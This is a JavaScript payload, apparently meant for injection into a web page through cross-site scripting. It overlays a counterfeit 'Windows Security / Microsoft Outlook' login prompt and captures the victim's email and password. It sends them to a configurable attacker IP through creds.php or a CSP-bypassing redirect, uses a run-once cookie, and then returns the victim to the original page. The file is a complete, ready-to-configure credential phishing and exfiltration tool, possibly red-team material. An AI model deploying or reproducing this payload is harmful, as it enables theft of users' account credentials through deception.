var html = `
<style>
  .button73 {
    width: 190px;
    height: 30px;
    background-color: #A9A9A9;
    border: none;
    color: black;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 14px;
    margin: 4px 2px;
    cursor: pointer;
  }
  .textbox73 {
    height: 26px;
    background-color: #E5E5E5;
    color: black;
    text-indent: 5px;
    border: 1px solid black;
  }
  .textbox73:focus {
    background-color: white;
    border: 1px solid #0080FF;
    box-shadow: none;
    outline: none;
  }
  .checkbox73 input {
    display: none;
  }
  .checkbox73 .checkmark73 {
    position: relative;
    display: inline-block;
    margin-left: 4px;
    margin-top: 4px;
    height: 14px;
    width: 14px;
    background-color: #E5E5E5;
    border: 2px solid black;
  }
  .checkbox73 .checkmark73:after {
    content: "";
    position: absolute;
    display: none;
    left: 4px;
    top: 0px;
    width: 5px;
    height: 8px;
    border: solid black;
    border-width: 0 2px 2px 0;
    transform: rotate(45deg);
  }
  .checkbox73 input:checked ~ .checkmark73:after {
    display: block;
  }
</style>
<div id=\"bg\" style=\"position: fixed; z-index: 100; width: 100%; height: 100%; background-color: #000000; opacity: 0.6; top: 0; left: 0; margin: 0;\">
</div>
<div id=\"credsform\" style=\"position: fixed; z-index: 101; top: 30%; left: 50%; transform: translate(-50%); width: 420px; height: 300px; padding: 0px; background-color: #D2D2D2; border:1px solid black; font-family: Calibri, sans-serif; font-size: 12px;\">
  <p style=\"margin-left: 12px; margin-top: 8px; font-size: 10px; user-select: none;\">Windows Security</p>
  <p style=\"margin-left: 12px; margin-top: 14px; font-size: 18px; user-select: none;\">Microsoft Outlook</p>
  <p style=\"margin-left: 12px; margin-top: 18px; font-size: 12px; user-select: none;\">Connecting to outlook.office365.com</p>
  <form onsubmit=\"return false;\">
    <p style=\"margin-left: 12px; margin-top: 16px;\"><input type=\"text\" name=\"username\" id=\"username\" class=\"textbox73\" placeholder=\"Email address\" size=\"32\" autofocus></p>
    <p style=\"margin-left: 12px; margin-top: 10px;\"><input type=\"password\" name=\"password\" id=\"password\" class=\"textbox73\" placeholder=\"Password\" size=\"32\"></p>
    <p style=\"margin-left: 8px; margin-top: 14px; user-select: none;\"><label class=\"checkbox73\"><input type=\"checkbox\" name=\"checkbox\" id=\"checkbox\"><span class=\"checkmark73\"></span></label><label style=\"margin-left: 6px; font-size: 12px; vertical-align: super;\">Remember my credentials</label></p>
    <p style=\"margin-left: 12px; margin-top: 30px;\"><input type=\"button\" name=\"okbutton\" id=\"okbutton\" class=\"button73\" value=\"OK\" onclick=\"submitLoginForm()\"><input type=\"button\" class=\"button73\" value=\"Cancel\" onclick=\"submitLoginForm()\"></p>
  </form>
</div> `;
async function getURL(url) {
  return await fetch(url, {mode:"no-cors"});
}
async function submitLoginForm() {
  // !!! CHANGE THIS !!! >>>>>>
  var scheme = "http";
  var attIP = "192.168.5.13";
  var attPort = "80";
  var bypassCSP = false;
  // <<<<<<
  var redirectURL = window.location.protocol + '//' + window.location.hostname + window.location.pathname;
  var username = document.getElementById("username").value;
  var password = document.getElementById("password").value;
  // CASE: CSP BYPASS REQUIRED
  if (bypassCSP)
  {
    document.location = (scheme.concat("://").concat(attIP).concat(":").concat(attPort).concat("/redir.php?user=").concat(username).concat("&pass=").concat(password).concat("&redir=").concat(redirectURL));
  }
  // CASE: CSP BYPASS NOT REQUIRED
  else
  {
    var url = (scheme.concat("://").concat(attIP).concat(":").concat(attPort).concat("/creds.php?user=").concat(username).concat("&pass=").concat(password));
    await this.getURL(url);
    window.open(redirectURL, "_self");
  }
}
var expire = new Date();
expire.setFullYear(expire.getFullYear() + 1);
var cookie = "runonce=true; path=/; expires=" + expire.toUTCString();
var div = document.createElement("div");
if (document.cookie.indexOf("runonce=") < 0) {
    div.innerHTML = html;
    document.getElementsByTagName("body")[0].appendChild(div);
    document.cookie = cookie;
}
document.getElementById("password").addEventListener("keyup", event => {
    if(event.key !== "Enter") return;
    document.getElementById("okbutton").click();
    event.preventDefault();
});
